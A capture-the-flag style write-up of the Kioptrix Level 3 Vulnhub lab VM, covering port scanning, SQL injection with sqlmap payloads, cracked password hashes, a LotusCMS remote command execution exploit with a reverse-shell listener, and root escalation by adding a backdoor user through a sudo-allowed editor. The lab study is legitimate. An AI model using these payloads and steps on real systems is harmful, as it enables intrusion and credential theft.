---
title: Vulnhub, Kioptrix, Level 3
date: Thu Aug 15 05:01:39 PM EDT 2024
categories: [PentestNotes]
tags: [sqli,lotuscms,cms,vulnhub,]
---

## About Release

- **Name**: Kioptrix: Level 1.2 (#3)
- **Date release**: 18 Apr 2011
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: [http://www.kioptrix.com/blog/?p=358](http://www.kioptrix.com/blog/?p=358)
## Download

- **KVM3.rar** (Size: 442 MB)
- **Download**: [http://www.kioptrix.com/dlvm/KVM3.rar](http://www.kioptrix.com/dlvm/KVM3.rar)
- **Download (Mirror)**: [https://download.vulnhub.com/kioptrix/KVM3.rar](https://download.vulnhub.com/kioptrix/KVM3.rar)
## Description

It's been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.

After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.

As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…

**Important** thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to **kioptrix3.com**

Under Windows, you would edit _`C:\Windows\System32\drivers\etc\hosts`_ to look something like this:

```
# localhost name resolution is handled within DNS itself.
#   127.0.0.1 localhost
#   ::1 localhost127.0.0.1 static3.cdn.ubi.com
192.168.1.102 kioptrix3.com
```

Under Linux that would be _`/etc/hosts`_

There’s a web application involved, so to have everything nice and properly displayed you really need to this.

Hope you enjoy Kioptrix VM Level 1.2 challenge.

452 Megs

MD5 Hash : d324ffadd8e3efc1f96447eec51901f2

Have fun

Source: [http://www.kioptrix.com/blog/?p=358](http://www.kioptrix.com/blog/?p=358)
## Recon

```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24

└─$ sudo netdiscover -P -i eth0 -r 10.0.2.0/24 | tee netdiscover.log
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:64:6e:66      1      60  PCS Systemtechnik GmbH
 10.0.2.21       08:00:27:0c:18:78      1      60  PCS Systemtechnik GmbH

-- Active scan completed, 4 Hosts found.

```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ￢ﾌ

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.21:22
Open 10.0.2.21:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.21
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-22 17:16 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:16
Completed Parallel DNS resolution of 1 host. at 17:16, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:16
Scanning 10.0.2.21 [2 ports]
Discovered open port 80/tcp on 10.0.2.21
Discovered open port 22/tcp on 10.0.2.21
Completed Connect Scan at 17:16, 0.00s elapsed (2 total ports)
Initiating Service scan at 17:16
Scanning 2 services on 10.0.2.21
Completed Service scan at 17:16, 6.04s elapsed (2 services on 1 host)
NSE: Script scanning 10.0.2.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
Nmap scan report for 10.0.2.21
Host is up, received user-set (0.00052s latency).
Scanned at 2024-07-22 17:16:27 UTC for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30e3f6dc2e225d17ac460239ad71cb49 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAL4CpDFXD9Zn2ONktcyGQL37Dn6s9JaOv3oKjxfdiABm9GjRkLEtbSAK3vhBBUJTZcVKYZk21lFHAqoe/+pLr4U9yOLOBbSoKNSxQ2VHN9FOLc9C58hKMF/0sjDsSIZnaI4zO7M4HmdEMYXONrmj2x6qczbfqecs+z4cEYVUF3R3AAAAFQCuG9mm7mLm1GGqZRSICZ+omMZkKQAAAIEAnj8NDH48hL+Pp06GWQZOlhte8JRZT5do6n8+bCgRSOvaYLYGoNi/GBzlET6tMSjWMsyhVY/YKTNTXRjqzS1DqbODM7M1GzLjsmGtVlkLoQafV6HJ25JsKPCEzSImjeOCpzwRP5opjmMrYBMjjKqtIlWYpaUijT4uR08tdaTxCukAAACBAJeJ9j2DTugDAy+SLCa0dZCH+jnclNo3o6oINF1FjzICdgDONL2YbBeU3CiAL2BureorAE0lturvvrIC2xVn2vHhrLpz6NPbDAkrLV2/rwoavbCkYGrwXdBHd5ObqBIkoUKbI1hGIGA51nafI2tjoXPfIeHeNOep20hgr32x9x1x
|   2048 9a82e696e47ed6a6d74544cb19aaecdd (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyOv6c+5ON+N+ZNDtjetiZ0eUxnIR1U0UqSF+a24Pz2xqdnJC1EN0O3zxGJB3gfPdJlyqUDiozbEth1GBP//8wbWsa1pLJOL1YmcumEJCsitngnrVN7huACG127UjKP8hArECjCHzc1P372gN3AQ/h5aZd0VV17e03HnAJ64ZziOQzVJ+DKWJbiHoXC2cdD1P+nlhK5fULe0QBvmA14gkl2LWA6KILHiisHZpF+V3X7NvXYyCSSI9GeXwhW4RKOCGdGVbjYf7d93K9gj0oU7dHrbdNKgX0WosuhMuXmKleHkIxfyLAILYWrRRj0GVdhZfbI99J3TYaR/yLTpb0D6mhw==
80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:16
Completed NSE at 17:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ grep kio /etc/hosts
10.0.2.21       kioptrix3.com
```

## HTTP (80)

![Writeup.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup.png)

`See it now!` redirects us to `/gallery` where we can see path is used to retrieve certain items from probably database. After trying few payloads it doesn't seem injectable.

![Writeup-1.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-1.png)

If we visit Ligoat Press Room there's a sort feature which seems to add parameters to the query.

![Writeup-2.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-2.png)

### SQLi

Injecting a quote  (`'`) triggers SQL error, meaning SQLi

![Writeup-3.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-3.png)

```bash
└─$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename' --dbms=mysql --batch --current-db --dump
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (6172=6172) THEN 1 ELSE (SELECT 2162 UNION SELECT 4307) END))&sort=filename

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(5785,2330)>(SELECT COUNT(*),CONCAT(0x71626b6271,(SELECT (ELT(5785=5785,1))),0x717a6a6a71,FLOOR(RAND(0)*2))x FROM (SELECT 5230 UNION SELECT 2834 UNION SELECT 6888 UNION SELECT 5045)a GROUP BY x)&sort=filename

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 2862 FROM (SELECT(SLEEP(5)))GVIe)&sort=filename

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71626b6271,0x426b4a7a56777a4a6d6856537a45637a7772794a486d41506e6b78767a78434a6a46514c44506676,0x717a6a6a71),NULL,NULL,NULL,NULL-- -&sort=filename
---
...
└─$ bat ~/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv
───────┬────────────────────────────────────────────────────────────────────────────
       │ File: /home/woyag/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv
───────┼────────────────────────────────────────────────────────────────────────────
   1   │ id,password,username
   2   │ 1,0d3eccfb887aabd50f243b3f155c0f85,dreg
   3   │ 2,5badcaf789d3d1d09794d8f021f40f0e,loneferret
───────┴────────────────────────────────────────────────────────────────────────────
└─$ bat ~/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/gallarific_users.csv
───────┬────────────────────────────────────────────────────────────────────────────────
       │ File: /home/woyag/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/gallarific_users.csv
───────┼────────────────────────────────────────────────────────────────────────────────
   1   │ userid,email,photo,website,joincode,lastname,password,username,usertype,firstname,datejoined,issuperuser
   2   │ 1,<blank>,<blank>,<blank>,<blank>,User,n0t7t1k4,admin,superuser,Super,1302628616,1
───────┴────────────────────────────────────────────────────────────────────────────────
```

### Database Accounts

Crack the user hashes:

![Writeup-4.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-4.png)

| Hash                             | Type | Result   |
| -------------------------------- | ---- | -------- |
| 0d3eccfb887aabd50f243b3f155c0f85 | md5  | Mast3r   |
| 5badcaf789d3d1d09794d8f021f40f0e | md5  | starwars |

#### SSH Creds

| Username   | Password |
| ---------- | -------- |
| admin      | n0t7t1k4 |
| dreg       | Mast3r   |
| loneferret | starwars |

Oddly enough none of the users worked on [CMS login page](http://kioptrix3.com/index.php?system=Admin), but they are valid ssh credentials! (except admin)

### LotusCMS

The CMS which webapp uses is LotusCMS

![Writeup-5.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-5.png)

Quick google search leads us to [LotusCMS 3.0 eval() Remote Command Execution](https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec/)

The msf module was unable to get shell:
```bash
msf6 > use exploit/multi/http/lcms_php_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/lcms_php_exec) > set RHOST 10.0.2.21
RHOST => 10.0.2.21
msf6 exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf6 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Exploit completed, but no session was created.
```

```bash
└─$ git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit.git
└─$ cd LotusCMS-Exploit
└─$ bash lotusRCE.sh kioptrix3.com /
---
└─$ listen # rlwrap ncat -lvnp 4444
```

#### www-data

![Writeup-6.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-6.png)

Anyway, we don't need to go further into this path as we already have actual user accounts on ssh.

## SSH (22)

We have 2 users which we can login as.

```bash
└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@10.0.2.21
dreg@Kioptrix3:~$ id
uid=1001(dreg) gid=1001(dreg) groups=1001(dreg)
dreg@Kioptrix3:~$ sudo -l
[sudo] password for dreg: Mast3r
Sorry, user dreg may not run sudo on Kioptrix3.
dreg@Kioptrix3:~$ su - loneferret
Password: starwars
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

Looks like `loneferret` has sudo access, so we'll discard `dreg`.

### Sudo Binaries

Great, `su` doesn't exist in given path and `ht` is wacky program...
```bash
loneferret@Kioptrix3:~$ sudo /usr/bin/su
sudo: /usr/bin/su: command not found
loneferret@Kioptrix3:~$ ls /usr/bin/s?
/usr/bin/sg
loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
Error opening terminal: tmux-256color.
```

```bash
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

Since I couldn't run binary, get help or man page I decided to see `strings` within program, after piping result to `less` I got `terminal is not fully functional`

### Fix Terminal

[ArchLinux » Networking, Server, and Protection» WARNING: terminal is not fully functional](https://bbs.archlinux.org/viewtopic.php?id=113945)

```bash
loneferret@Kioptrix3:~$ ht
Error opening terminal: tmux-256color.
loneferret@Kioptrix3:~$ strings /usr/local/bin/ht | less
WARNING: terminal is not fully functional
loneferret@Kioptrix3:~$ export TERM=rxvt
loneferret@Kioptrix3:~$ ht # <-- Worked
loneferret@Kioptrix3:~$
```

Setting `TERM` fixed the issue with the binary.

```bash
sudo /usr/local/bin/ht
```

![Writeup-7.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-7.png)

The program is some sort of editor. The first highlighted letters are actually shortcuts which can be accessed via `Alt+KEY`.

To open file `Alt+F -> Arrow Down -> Open -> Filename`

We essentially have a binary with root privileges, meaning we can read/write whatever.

### Add New User

Let's add new user to system:
```bash
└─$ openssl passwd -6 -salt back door
$6$back$ZEe0NXkJ.MD8pgefaf8ihIknjA5aBcdHra0qz2/784AoQlin/X/qlqsQj2LdqXs55GHAA2PgcjB121eZSuP5I0
```

![Writeup-8.png](/assets/images/Vulnhub/Kioptrix-Level-3/Writeup-8.png)
### Root

```bash
loneferret@Kioptrix3:~$ su - uwu
Password: door
No directory, logging in with HOME=/
root@Kioptrix3:/# cd /root
root@Kioptrix3:/root# ls -l
total 16
-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt
drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasnt that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS:
http://www.lotuscms.org

Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```